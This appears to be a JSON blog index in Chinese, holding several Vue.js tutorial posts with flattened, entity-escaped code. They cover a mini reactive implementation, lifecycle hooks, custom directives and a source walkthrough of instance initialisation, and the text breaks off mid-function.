Dep\nCompiler：解析每个元素中的指令&#x2F;插值表达式，并替换成相应的数据\nDep：添加观察者(watcher)，当数据变化通知所有观察者\nWatcher：数据变化更新视图\n\nVue\n功能\n负责接收初始化的参数(选项)\n负责把 data 中的属性注入到 Vue 实例，转换成 getter/setter\n负责调用 observer 监听 data 中所有属性的变化\n负责调用 compiler 解析指令&#x2F;插值表达式\n\n\n结构\n\n\nclass Vue &#123;  constructor (options) &#123;    // 1. 保存选项的数据    this.$options = options || &#123;&#125;    this.$data = options.data || &#123;&#125;    const el = options.el    this.$el = typeof options.el === &#x27;string&#x27; ? document.querySelector(el) : el    // 2. 负责把 data 注入到 Vue 实例    this._proxyData(this.$data)    // 3. 负责调用 Observer 实现数据劫持    // 4. 负责调用 Compiler 解析指令/插值表达式等  &#125;  _proxyData (data) &#123;    // 遍历 data 的所有属性    Object.keys(data).forEach(key =&gt; &#123;      Object.defineProperty(this, key, &#123;        get () &#123;          return data[key]        &#125;,        set (newValue) &#123;          if (data[key] === newValue) &#123;            return          &#125;          data[key] = newValue        &#125;      &#125;)    &#125;)  &#125;&#125;\n\nObserver\n功能\n负责把 data 选项中的属性转换成响应式数据\ndata 中的某个属性也是对象，把该属性转换成响应式数据\n数据变化发送通知\n\n\n结构\n\n\n// 负责数据劫持// 把 $data 中的成员转换成 getter/setterclass Observer &#123;  constructor (data) &#123;    this.walk(data)  &#125;  // 1. 判断数据是否是对象，如果不是对象返回  // 2. 如果是对象，遍历对象的所有属性，设置为 getter/setter  walk (data) &#123;    if (!data || typeof data !== &#x27;object&#x27;) &#123;      return    &#125;    // 遍历 data 的所有成员    Object.keys(data).forEach(key =&gt; &#123;      this.defineReactive(data, key, data[key])    &#125;)  &#125;  // 定义响应式成员  defineReactive (data, key, val) &#123;    const that = this    // 如果 val 是对象，继续设置它下面的成员为响应式数据    this.walk(val)    Object.defineProperty(data, key, &#123;      configurable: true,      enumerable: true,      get () &#123;        return val      &#125;,      set (newValue) &#123;        if (newValue === val) &#123;          return        &#125;        // 如果 newValue 是对象，设置 newValue 的成员为响应式        that.walk(newValue)        val = newValue      &#125;    &#125;)  &#125;&#125;\n\nCompiler\n功能\n负责编译模板，解析指令&#x2F;插值表达式\n负责页面的首次渲染\n当数据变化后重新渲染视图\n\n\n结构\n\n\n1. compile()\n// 负责解析指令/插值表达式class Compiler &#123;  constructor (vm) &#123;    this.vm = vm    this.el = vm.$el    // 编译模板    this.compile(this.el)  &#125;  // 编译模板  // 处理文本节点和元素节点  compile (el) &#123;    const nodes = el.childNodes    Array.from(nodes).forEach(node =&gt; &#123;      // 判断是文本节点还是元素节点      if (this.isTextNode(node)) &#123;        this.compileText(node)      &#125; else if (this.isElementNode(node)) &#123;        this.compileElement(node)      &#125;      if (node.childNodes &amp;&amp; node.childNodes.length) &#123;        // 如果当前节点中还有子节点，递归编译        this.compile(node)      &#125;    &#125;)  &#125;  // 判断是否是文本节点  isTextNode (node) &#123;    return node.nodeType === 3  &#125;  // 判断是否是属性节点  isElementNode (node) &#123;    return node.nodeType === 1  &#125;  // 判断是否是以 v- 开头的指令  isDirective (attrName) &#123;    return attrName.startsWith(&#x27;v-&#x27;)  &#125;  // 编译文本节点  compileText (node) &#123; &#125;  // 编译属性节点   compileElement (node) &#123; &#125;&#125;\n\n2. compileText()\n\n负责编译插值表达式\n\n// 编译文本节点compileText (node) &#123;  const reg = /\\&#123;\\&#123;(.+)\\&#125;\\&#125;/  // 获取文本节点的内容  const value = node.textContent  if (reg.test(value)) &#123;    // 插值表达式中的值就是我们要的属性名称    const key = RegExp.$1.trim()    // 把插值表达式替换成具体的值    node.textContent = value.replace(reg, this.vm[key])  &#125;&#125;\n\n3. compileElement()\n\n负责编译元素的指令\n处理 v-text 的首次渲染\n处理 v-model 的首次渲染\n\n// 编译属性节点compileElement (node) &#123;  // 遍历元素节点中的所有属性，找到指令  Array.from(node.attributes).forEach(attr =&gt; &#123;    // 获取元素属性的名称    let attrName = attr.name    // 判断当前的属性名称是否是指令    if (this.isDirective(attrName)) &#123;      // attrName 的形式 v-text v-model      // 截取属性的名称，获取 text model      attrName = attrName.substr(2)      // 获取属性的名称，属性的名称就是我们数据对象的属性 v-text=&quot;name&quot;，获取的是name      const key = attr.value      // 处理不同的指令      this.update(node, key, attrName)    &#125;  &#125;)&#125;// 负责更新 DOM// 创建 Watcherupdate (node, key, dir) &#123;  // node 节点，key 数据的属性名称，dir 指令的后半部分  const updaterFn = this[dir + &#x27;Updater&#x27;]  updaterFn &amp;&amp; updaterFn(node, this.vm[key])&#125;// v-text 指令的更新方法textUpdater (node, value) &#123;  node.textContent = value&#125;// v-model 指令的更新方法modelUpdater (node, value) &#123;  node.value = value&#125;\n\nDep(Dependency)\n\n功能\n收集依赖，添加观察者(watcher)\n通知所有观察者\n\n\n结构\n\n\nclass Dep &#123;  constructor () &#123;    // 存储所有的观察者    this.subs = []  &#125;  // 添加观察者   addSub (sub) &#123;    if (sub &amp;&amp; sub.update) &#123; this.subs.push(sub)    &#125;   &#125;  // 通知所有观察者   notify () &#123;    this.subs.forEach(sub =&gt; sub.update())   &#125;&#125;\n\n\n在 compiler.js 中收集依赖，发送通知\n\n// defineReactive 中// 创建 dep 对象收集依赖const dep = new Dep()// getter 中// get 的过程中收集依赖Dep.target &amp;&amp; dep.addSub(Dep.target)// setter 中// 当数据变化之后，发送通知dep.notify()\n\nWatcher\n\n功能\n当数据变化触发依赖， dep 通知所有的 Watcher 实例更新视图\n自身实例化的时候往 dep 对象中添加自己-结构\n\n\n\n\nclass Watcher &#123;  constructor (vm, key, cb) &#123;    this.vm = vm    // data 中的属性名称    this.key = key    // 当数据变化的时候，调用 cb 更新视图    this.cb = cb    // 在 Dep 的静态属性上记录当前 watcher 对象，当访问数据的时候把 watcher 添加到dep 的 subs 中    Dep.target = this    // 触发一次 getter，让 dep 为当前 key 记录 watcher    this.oldValue = vm[key]    // 清空 target    Dep.target = null  &#125;  update () &#123;    const newValue = this.vm[this.key]    if (this.oldValue === newValue) &#123;      return    &#125;    this.cb(newValue)  &#125;&#125;\n\n\n在 compiler.js 中为每一个指令&#x2F;插值表达式创建 watcher 对象，监视数据的变化\n\n// 因为在 textUpdater等中要使用 thisupdaterFn &amp;&amp; updaterFn.call(this, node, this.vm[key], key)// v-text 指令的更新方法textUpdater (node, value, key) &#123;  node.textContent = value  // 每一个指令中创建一个 watcher，观察数据的变化  new Watcher(this.vm, key, value =&gt; &#123;    node.textContent = value  &#125;)&#125;\n\n视图变化更新数据// v-model 指令的更新方法modelUpdater (node, value, key) &#123;  node.value = value  // 每一个指令中创建一个 watcher，观察数据的变化  new Watcher(this.vm, key, value =&gt; &#123;    node.value = value  &#125;  // 监听视图的变化  node.addEventListener(&#x27;input&#x27;, () =&gt; &#123;    this.vm[key] = node.value  &#125;)&#125;\n\n总结通过下图回顾整体流程\n\n\nVue\n\n记录传入的选项，设置 $data/$el\n把 data 的成员注入到 Vue 实例\n负责调用 Observer 实现数据响应式处理(数据劫持)\n负责调用 Compiler 编译指令&#x2F;插值表达式等\n\n\nObserver\n  - 数据劫持    - 负责把 `data` 中的成员转换成 `getter/setter`    - 负责把多层属性转换成 `getter/setter`    - 如果给属性赋值为新对象，把新对象的成员设置为 `getter/setter`  - 添加 `Dep` 和 `Watcher` 的依赖关系  - 数据变化发送通知- ```  Compiler\n\n- 负责编译模板，解析指令/插值表达式\n- 负责页面的首次渲染过程\n- 当数据变化后重新渲染\n\n\n&#96;&#96;&#96;Dep\n  - 收集依赖，添加订阅者(`watcher`)  - 通知所有订阅者- ```  Watcher\n\n\n自身实例化的时候往dep对象中添加自己\n当数据变化dep通知所有的 Watcher 实例更新视图\n\n\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue-声明周期","url":"/2018/08/13/Vue/vue-%E5%A3%B0%E6%98%8E%E5%91%A8%E6%9C%9F/","content":"\n每个Vue实例在被创建之前都要经过一系列的初始化过程,这个过程就是vue的生命周期\n\n\n一、生命周期钩子函数\nbeforeCreate\ncreated\nbeforeMount\nmounted\nbeforeUpdate\nupdated\nbeforeDestroy\ndestroyed\n\nvar vm = new Vue(&#123;    el: &#x27;#app&#x27;,    data: &#123;      message: &#x27;Vue的生命周期&#x27;    &#125;,    beforeCreate: function() &#123;      console.group(&#x27;------beforeCreate创建前状态------&#x27;);      console.log(&quot;%c%s&quot;, &quot;color:red&quot; , &quot;el     : &quot; + this.$el); //undefined      console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;data   : &quot; + this.$data); //undefined       console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;message: &quot; + this.message)     &#125;,    created: function() &#123;      console.group(&#x27;------created创建完毕状态------&#x27;);      console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;el     : &quot; + this.$el); //undefined      console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;data   : &quot; + this.$data); //已被初始化       console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;message: &quot; + this.message); //已被初始化    &#125;,    beforeMount: function() &#123;      console.group(&#x27;------beforeMount挂载前状态------&#x27;);      console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;el     : &quot; + (this.$el)); //已被初始化      console.log(this.$el);      console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;data   : &quot; + this.$data); //已被初始化        console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;message: &quot; + this.message); //已被初始化      &#125;,    mounted: function() &#123;      console.group(&#x27;------mounted 挂载结束状态------&#x27;);      console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;el     : &quot; + this.$el); //已被初始化      console.log(this.$el);          console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;data   : &quot; + this.$data); //已被初始化      console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;message: &quot; + this.message); //已被初始化     &#125;,    beforeUpdate: function () &#123;      console.group(&#x27;beforeUpdate 更新前状态===============》&#x27;);      console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;el     : &quot; + this.$el);      console.log(this.$el);         console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;data   : &quot; + this.$data);       console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;message: &quot; + this.message);     &#125;,    updated: function () &#123;      console.group(&#x27;updated 更新完成状态===============》&#x27;);      console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;el     : &quot; + this.$el);      console.log(this.$el);       console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;data   : &quot; + this.$data);       console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;message: &quot; + this.message);     &#125;,    beforeDestroy: function () &#123;      console.group(&#x27;beforeDestroy 销毁前状态===============》&#x27;);      console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;el     : &quot; + this.$el);      console.log(this.$el);          console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;data   : &quot; + this.$data);       console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;message: &quot; + this.message);     &#125;,    destroyed: function () &#123;      console.group(&#x27;destroyed 销毁完成状态===============》&#x27;);      console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;el     : &quot; + this.$el);      console.log(this.$el);        console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;data   : &quot; + this.$data);       console.log(&quot;%c%s&quot;, &quot;color:red&quot;,&quot;message: &quot; + this.message)    &#125;  &#125;)\n\n\n二、生命周期详解\nvue实例在创建过程中调用的几个生命周期钩子\n\n2.1 beforeCreate、created\n在beforeCreate和created钩子函数之间的生命周期\n\n\n在这个生命周期之间，进行初始化事件，进行数据的观测，可以看到在created的时候数据已经和data属性进行绑定（放在data中的属性当值发生改变的同时，视图也会改变）,此时还是没有el选项\n\n2.2 created、beforeMount\ncreated钩子函数和beforeMount间的生命周期\n\n\n\n首先会判断对象是否有el选项。如果有的话就继续向下编译，如果没有el选项，则停止编译，也就意味着停止了生命周期，直到在该vue实例上调用vm.$mount(el)。\n此时注释掉代码中 el: &#39;#app&#39;, 然后运行可以看到到created的时候就停止了\n\n\n\n如果我们在后面继续调用vm.$mount(el),可以发现代码继续向下执行了\n\n\nvm.$mount(el) &#x2F;&#x2F;这个el参数就是挂在的dom接点\n\ntemplate参数选项的有无对生命周期的影响\n\n如果vue实例对象中有template参数选项，则将其作为模板编译成render函数\n如果没有template选项，则将外部HTML作为模板编译\n可以看到template中的模板优先级要高于outer HTML的优先级\n\n\n修改代码如下, 在HTML结构中增加了一串html，在vue对象中增加了template选项\n\n&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;  &lt;meta charset=&quot;UTF-8&quot;&gt;  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;  &lt;title&gt;vue生命周期学习&lt;/title&gt;  &lt;script src=&quot;https://cdn.bootcss.com/vue/2.4.2/vue.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;  &lt;div id=&quot;app&quot;&gt;    &lt;!--html中修改的--&gt;    &lt;h1&gt;&#123;&#123;message + &#x27;这是在outer HTML中的&#x27;&#125;&#125;&lt;/h1&gt;  &lt;/div&gt;&lt;/body&gt;&lt;script&gt;  var vm = new Vue(&#123;    el: &#x27;#app&#x27;,    template: &quot;&lt;h1&gt;&#123;&#123;message +&#x27;这是在template中的&#x27;&#125;&#125;&lt;/h1&gt;&quot;, //在vue配置项中修改的    data: &#123;      message: &#x27;Vue的生命周期&#x27;    &#125;&lt;/script&gt;&lt;/html&gt;\n\n\n输出 Vue的生命周期--这是在template中的\n\n那么将vue对象中template的选项注释掉后打印如下信息\n\n输出 Vue的生命周期--这是在outer HTML中的\n\n\n可以想想什么el的判断要在template之前了~是因为vue需要通过el找到对应的outer template\n在vue对象中还有一个render函数，它是以createElement作为参数，然后做渲染操作，而且我们可以直接嵌入JSX.\n\nnew Vue(&#123;    el: &#x27;#app&#x27;,    render: function(createElement) &#123;        return createElement(&#x27;h1&#x27;, &#x27;this is createElement&#x27;)    &#125;&#125;)\n\n所以综合排名优先级\n\nrender函数选项 &gt; template选项 &gt; outer HTML\n\n2.3 beforeMount、mounted\nbeforeMount和mounted钩子函数间的生命周期\n\n\n\n可以看到此时是给vue实例对象添加$el成员，并且替换掉挂在的DOM元素。因为在之前console中打印的结果可以看到beforeMount之前el上还是undefined\n\n2.4 mounted\n\n在mounted之前h1中还是通过&#123;message&#125;进行占位的，因为此时还有挂在到页面上，还是JavaScript中的虚拟DOM形式存在的。在mounted之后可以看到h1中的内容发生了变化\n\n2.5 beforeUpdate、updated\nbeforeUpdate钩子函数和updated钩子函数间的生命周期\n\n\n\n当vue发现data中的数据发生了改变，会触发对应组件的重新渲染，先后调用beforeUpdate和updated钩子函数。我们在console中输入\n\nvm.message = &#x27;触发组件更新&#x27;\n\n发现触发了组件的更新\n\n2.6 beforeDestroy、destroyed\nbeforeDestroy和destroyed钩子函数间的生命周期\n\n\n\nbeforeDestroy钩子函数在实例销毁之前调用。在这一步，实例仍然完全可用。\ndestroyed钩子函数在Vue 实例销毁后调用。调用后，Vue实例指示的所有东西都会解绑定，所有的事件监听器会被移除，所有的子实例也会被销毁\n\n","categories":["框架"],"tags":["vue"]},{"title":"vue-指令","url":"/2018/09/06/Vue/vue-%E6%8C%87%E4%BB%A4/","content":"一、什么是指令指令系统是计算机硬件的语言系统，也叫机器语言，它是系统程序员看到的计算机的主要属性。因此指令系统表征了计算机的基本功能决定了机器所要求的能力\n在vue中提供了一套为数据驱动视图更为方便的操作，这些操作被称为指令系统\n我们看到的v-开头的行内属性，都是指令，不同的指令可以完成或实现不同的功能\n除了核心功能默认内置的指令 (v-model 和 v-show)，Vue 也允许注册自定义指令\n指令使用的几种方式：\n//会实例化一个指令，但这个指令没有参数 `v-xxx`// -- 将值传到指令中`v-xxx=&quot;value&quot;`  // -- 将字符串传入到指令中，如`v-html=&quot;&#x27;&lt;p&gt;内容&lt;/p&gt;&#x27;&quot;``v-xxx=&quot;&#x27;string&#x27;&quot;` // -- 传参数（`arg`），如`v-bind:class=&quot;className&quot;``v-xxx:arg=&quot;value&quot;` // -- 使用修饰符（`modifier`）`v-xxx:arg.modifier=&quot;value&quot;` \n\n二、如何实现注册一个自定义指令有全局注册与局部注册\n全局注册主要是通过Vue.directive方法进行注册\nVue.directive第一个参数是指令的名字（不需要写上v-前缀），第二个参数可以是对象数据，也可以是一个指令函数\n// 注册一个全局自定义指令 `v-focus`Vue.directive(&#x27;focus&#x27;, &#123;  // 当被绑定的元素插入到 DOM 中时……  inserted: function (el) &#123;    // 聚焦元素    el.focus()  // 页面加载完成之后自动让输入框获取到焦点的小功能  &#125;&#125;)\n\n局部注册通过在组件options选项中设置directive属性\ndirectives: &#123;  focus: &#123;    // 指令的定义    inserted: function (el) &#123;      el.focus() // 页面加载完成之后自动让输入框获取到焦点的小功能    &#125;  &#125;&#125;\n\n然后你可以在模板中任何元素上使用新的 v-focus property，如下：\n&lt;input v-focus /&gt;\n\n自定义指令也像组件那样存在钩子函数：\n\nbind：只调用一次，指令第一次绑定到元素时调用。在这里可以进行一次性的初始化设置\ninserted：被绑定元素插入父节点时调用 (仅保证父节点存在，但不一定已被插入文档中)\nupdate：所在组件的 VNode 更新时调用，但是可能发生在其子 VNode 更新之前。指令的值可能发生了改变，也可能没有。但是你可以通过比较更新前后的值来忽略不必要的模板更新\ncomponentUpdated：指令所在组件的 VNode 及其子 VNode 全部更新后调用\nunbind：只调用一次，指令与元素解绑时调用\n\n所有的钩子函数的参数都有以下：\n\nel：指令所绑定的元素，可以用来直接操作 DOM\nbinding：一个对象，包含以下property：\nname：指令名，不包括 v- 前缀。\nvalue：指令的绑定值，例如：v-my-directive=&quot;1 + 1&quot; 中，绑定值为 2。\noldValue：指令绑定的前一个值，仅在 update 和 componentUpdated 钩子中可用。无论值是否改变都可用。\nexpression：字符串形式的指令表达式。例如 v-my-directive=&quot;1 + 1&quot; 中，表达式为 &quot;1 + 1&quot;。\narg：传给指令的参数，可选。例如 v-my-directive:foo 中，参数为 &quot;foo&quot;。\nmodifiers：一个包含修饰符的对象。例如：v-my-directive.foo.bar 中，修饰符对象为 &#123; foo: true, bar: true &#125;\n\n\nvnode：Vue 编译生成的虚拟节点\noldVnode：上一个虚拟节点，仅在 update 和 componentUpdated 钩子中可用\n\n\n除了 el 之外，其它参数都应该是只读的，切勿进行修改。如果需要在钩子之间共享数据，建议通过元素的 dataset 来进行\n\n举个例子：\n&lt;div v-demo=&quot;&#123; color: &#x27;white&#x27;, text: &#x27;hello!&#x27; &#125;&quot;&gt;&lt;/div&gt;&lt;script&gt;    Vue.directive(&#x27;demo&#x27;, function (el, binding) &#123;    console.log(binding.value.color) // &quot;white&quot;    console.log(binding.value.text)  // &quot;hello!&quot;    &#125;)&lt;/script&gt;\n\n\n\n三、应用场景使用自定义指令可以满足我们日常一些场景，这里给出几个自定义指令的案例：\n\n防抖\n图片懒加载\n一键 Copy的功能\n\n输入框防抖防抖这种情况设置一个v-throttle自定义指令来实现\n举个例子：\n// 1.设置v-throttle自定义指令Vue.directive(&#x27;throttle&#x27;, &#123;  bind: (el, binding) =&gt; &#123;    let throttleTime = binding.value; // 防抖时间    if (!throttleTime) &#123; // 用户若不设置防抖时间，则默认2s      throttleTime = 2000;    &#125;    let cbFun;    el.addEventListener(&#x27;click&#x27;, event =&gt; &#123;      if (!cbFun) &#123; // 第一次执行        cbFun = setTimeout(() =&gt; &#123;          cbFun = null;        &#125;, throttleTime);      &#125; else &#123;        event &amp;&amp; event.stopImmediatePropagation();      &#125;    &#125;, true);  &#125;,&#125;);// 2.为button标签设置v-throttle自定义指令&lt;button @click=&quot;sayHello&quot; v-throttle&gt;提交&lt;/button&gt;\n\n图片懒加载设置一个v-lazy自定义指令完成图片懒加载\nconst LazyLoad = &#123;    // install方法    install(Vue,options)&#123;    \t  // 代替图片的loading图        let defaultSrc = options.default;        Vue.directive(&#x27;lazy&#x27;,&#123;            bind(el,binding)&#123;                LazyLoad.init(el,binding.value,defaultSrc);            &#125;,            inserted(el)&#123;                // 兼容处理                if(&#x27;IntersectionObserver&#x27; in window)&#123;                    LazyLoad.observe(el);                &#125;else&#123;                    LazyLoad.listenerScroll(el);                &#125;                            &#125;,        &#125;)    &#125;,    // 初始化    init(el,val,def)&#123;        // data-src 储存真实src        el.setAttribute(&#x27;data-src&#x27;,val);        // 设置src为loading图        el.setAttribute(&#x27;src&#x27;,def);    &#125;,    // 利用IntersectionObserver监听el    observe(el)&#123;        let io = new IntersectionObserver(entries =&gt; &#123;            let realSrc = el.dataset.src;            if(entries[0].isIntersecting)&#123;                if(realSrc)&#123;                    el.src = realSrc;                    el.removeAttribute(&#x27;data-src&#x27;);                &#125;            &#125;        &#125;);        io.observe(el);    &#125;,    // 监听scroll事件    listenerScroll(el)&#123;        let handler = LazyLoad.throttle(LazyLoad.load,300);        LazyLoad.load(el);        window.addEventListener(&#x27;scroll&#x27;,() =&gt; &#123;            handler(el);        &#125;);    &#125;,    // 加载真实图片    load(el)&#123;        let windowHeight = document.documentElement.clientHeight        let elTop = el.getBoundingClientRect().top;        let elBtm = el.getBoundingClientRect().bottom;        let realSrc = el.dataset.src;        if(elTop - windowHeight&lt;0&amp;&amp;elBtm &gt; 0)&#123;            if(realSrc)&#123;                el.src = realSrc;                el.removeAttribute(&#x27;data-src&#x27;);            &#125;        &#125;    &#125;,    // 节流    throttle(fn,delay)&#123;        let timer;         let prevTime;        return function(...args)&#123;            let currTime = Date.now();            let context = this;            if(!prevTime) prevTime = currTime;            clearTimeout(timer);                        if(currTime - prevTime &gt; delay)&#123;                prevTime = currTime;                fn.apply(context,args);                clearTimeout(timer);                return;            &#125;            timer = setTimeout(function()&#123;                prevTime = Date.now();                timer = null;                fn.apply(context,args);            &#125;,delay);        &#125;    &#125;&#125;export default LazyLoad;\n\n一键 Copy的功能import &#123; Message &#125; from &#x27;ant-design-vue&#x27;;const vCopy = &#123; //  /*    bind 钩子函数，第一次绑定时调用，可以在这里做初始化设置    el: 作用的 dom 对象    value: 传给指令的值，也就是我们要 copy 的值  */  bind(el, &#123; value &#125;) &#123;    el.$value = value; // 用一个全局属性来存传进来的值，因为这个值在别的钩子函数里还会用到    el.handler = () =&gt; &#123;      if (!el.$value) &#123;      // 值为空的时候，给出提示，我这里的提示是用的 ant-design-vue 的提示，你们随意        Message.warning(&#x27;无复制内容&#x27;);        return;      &#125;      // 动态创建 textarea 标签      const textarea = document.createElement(&#x27;textarea&#x27;);      // 将该 textarea 设为 readonly 防止 iOS 下自动唤起键盘，同时将 textarea 移出可视区域      textarea.readOnly = &#x27;readonly&#x27;;      textarea.style.position = &#x27;absolute&#x27;;      textarea.style.left = &#x27;-9999px&#x27;;      // 将要 copy 的值赋给 textarea 标签的 value 属性      textarea.value = el.$value;      // 将 textarea 插入到 body 中      document.body.appendChild(textarea);      // 选中值并复制      textarea.select();      // textarea.setSelectionRange(0, textarea.value.length);      const result = document.execCommand(&#x27;Copy&#x27;);      if (result) &#123;        Message.success(&#x27;复制成功&#x27;);      &#125;      document.body.removeChild(textarea);    &#125;;    // 绑定点击事件，就是所谓的一键 copy 啦    el.addEventListener(&#x27;click&#x27;, el.handler);  &#125;,  // 当传进来的值更新的时候触发  componentUpdated(el, &#123; value &#125;) &#123;    el.$value = value;  &#125;,  // 指令与元素解绑的时候，移除事件绑定  unbind(el) &#123;    el.removeEventListener(&#x27;click&#x27;, el.handler);  &#125;,&#125;;export default vCopy;\n\n关于自定义指令还有很多应用场景，如：拖拽指令、页面水印、权限校验等等应用场景\n","categories":["框架"],"tags":["vue"]},{"url":"/2018/08/15/Vue/vue-%E5%AE%9E%E4%BE%8B%E6%8C%82%E8%BD%BD%E7%9A%84%E8%BF%87%E7%A8%8B/","content":"一、思考我们都听过知其然知其所以然这句话\n那么不知道大家是否思考过new Vue()这个过程中究竟做了些什么？\n过程中是如何完成数据的绑定，又是如何将数据渲染到视图的等等\n一、分析首先找到vue的构造函数\n源码位置：src\\core\\instance\\index.js\nfunction Vue (options) &#123;  if (process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp;    !(this instanceof Vue)  ) &#123;    warn(&#x27;Vue is a constructor and should be called with the `new` keyword&#x27;)  &#125;  this._init(options)&#125;\n\noptions是用户传递过来的配置项，如data、methods等常用的方法\nvue构建函数调用_init方法，但我们发现本文件中并没有此方法，但仔细可以看到文件下方定定义了很多初始化方法\ninitMixin(Vue);     // 定义 _initstateMixin(Vue);    // 定义 $set $get $delete $watch 等eventsMixin(Vue);   // 定义事件  $on  $once $off $emitlifecycleMixin(Vue);// 定义 _update  $forceUpdate  $destroyrenderMixin(Vue);   // 定义 _render 返回虚拟dom\n\n首先可以看initMixin方法，发现该方法在Vue原型上定义了_init方法\n源码位置：src\\core\\instance\\init.js\nVue.prototype._init = function (options?: Object) &#123;    const vm: Component = this    // a uid    vm._uid = uid++    let startTag, endTag    /* istanbul ignore if */    if (process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; config.performance &amp;&amp; mark) &#123;      startTag = `vue-perf-start:$&#123;vm._uid&#125;`      endTag = `vue-perf-end:$&#123;vm._uid&#125;`      mark(startTag)    &#125;    // a flag to avoid this being observed    vm._isVue = true    // merge options    // 合并属性，判断初始化的是否是组件，这里合并主要是 mixins 或 extends 的方法    if (options &amp;&amp; options._isComponent) &#123;      // optimize internal component instantiation      // since dynamic options merging is pretty slow, and none of the      // internal component options needs special treatment.      initInternalComponent(vm, options)    &#125; else &#123; // 合并vue属性      vm.$options = mergeOptions(        resolveConstructorOptions(vm.constructor),        options || &#123;&#125;,        vm      )    &#125;    /* istanbul ignore else */    if (process.env.NODE_ENV !== &#x27;production&#x27;) &#123;      // 初始化proxy拦截器      initProxy(vm)    &#125; else &#123;      vm._renderProxy = vm    &#125;    // expose real self    vm._self = vm    // 初始化组件生命周期标志位    initLifecycle(vm)    // 初始化组件事件侦听    initEvents(vm)    // 初始化渲染方法    initRender(vm)    callHook(vm, &#x27;beforeCreate&#x27;)    // 初始化依赖注入内容，在初始化data、props之前    initInjections(vm) // resolve injections before data/props    // 初始化props/data/method/watch/methods    initState(vm)    initProvide(vm) // resolve provide after data/props    callHook(vm, &#x27;created&#x27;)    /* istanbul ignore if */    if (process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; config.performance &amp;&amp; mark) &#123;      vm._name = formatComponentName(vm, false)      mark(endTag)      measure(`vue $&#123;vm._name&#125; init`, startTag, endTag)    &#125;    // 挂载元素    if (vm.$options.el) &#123;      vm.$mount(vm.$options.el)    &#125;  &#125;\n\n仔细阅读上面的代码，我们得到以下结论：\n\n在调用beforeCreate之前，数据初始化并未完成，像data、props这些属性无法访问到\n到了created的时候，数据已经初始化完成，能够访问data、props这些属性，但这时候并未完成dom的挂载，因此无法访问到dom元素\n挂载方法是调用vm.$mount方法\n\ninitState方法是完成props/data/method/watch/methods的初始化\n源码位置：src\\core\\instance\\state.js\nexport function initState (vm: Component) &#123;  // 初始化组件的watcher列表  vm._watchers = []  const opts = vm.$options  // 初始化props  if (opts.props) initProps(vm, opts.props)  // 初始化methods方法  if (opts.methods) initMethods(vm, opts.methods)  if (opts.data) &#123;    // 初始化data      initData(vm)  &#125; else &#123;    observe(vm._data = &#123;&#125;, true /* asRootData */)  &#125;  if (opts.computed) initComputed(vm, opts.computed)  if (opts.watch &amp;&amp; opts.watch !== nativeWatch) &#123;    initWatch(vm, opts.watch)  &#125;&#125;\n\n我们和这里主要看初始化data的方法为initData，它与initState在同一文件上\nfunction initData (vm: Component) &#123;  let data = vm.$options.data  // 获取到组件上的data  data = vm._data = typeof data === &#x27;function&#x27;    ? getData(data, vm)    : data || &#123;&#125;  if (!isPlainObject(data)) &#123;    data = &#123;&#125;    process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; warn(      &#x27;data functions should return an object:\\n&#x27; +      &#x27;https://vuejs.org/v2/guide/components.html#data-Must-Be-a-Function&#x27;,      vm    )  &#125;  // proxy data on instance  const keys = Object.keys(data)  const props = vm.$options.props  const methods = vm.$options.methods  let i = keys.length  while (i--) &#123;    const key = keys[i]    if (process.env.NODE_ENV !== &#x27;production&#x27;) &#123;      // 属性名不能与方法名重复      if (methods &amp;&amp; hasOwn(methods, key)) &#123;        warn(          `Method &quot;$&#123;key&#125;&quot; has already been defined as a data property.`,          vm        )      &#125;    &#125;    // 属性名不能与state名称重复    if (props &amp;&amp; hasOwn(props, key)) &#123;      process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; warn(        `The data property &quot;$&#123;key&#125;&quot; is already declared as a prop. ` +        `Use prop default value instead.`,        vm      )    &#125; else if (!isReserved(key)) &#123; // 验证key值的合法性      // 将_data中的数据挂载到组件vm上,这样就可以通过this.xxx访问到组件上的数据      proxy(vm, `_data`, key)    &#125;  &#125;  // observe data  // 响应式监听data是数据的变化  observe(data, true /* asRootData */)&#125;\n\n仔细阅读上面的代码，我们可以得到以下结论：\n\n初始化顺序：props、methods、data\ndata定义的时候可选择函数形式或者对象形式（组件只能为函数形式）\n\n关于数据响应式在这就不展开详细说明\n上文提到挂载方法是调用vm.$mount方法\n源码位置：\nVue.prototype.$mount = function (  el?: string | Element,  hydrating?: boolean): Component &#123;  // 获取或查询元素  el = el &amp;&amp; query(el)  /* istanbul ignore if */  // vue 不允许直接挂载到body或页面文档上  if (el === document.body || el === document.documentElement) &#123;    process.env.NODE_ENV !== &#x27;production&#x27; &amp;&amp; warn(      `Do not mount Vue to &lt;html&gt; or &lt;body&gt; - mount to normal elements instead.`    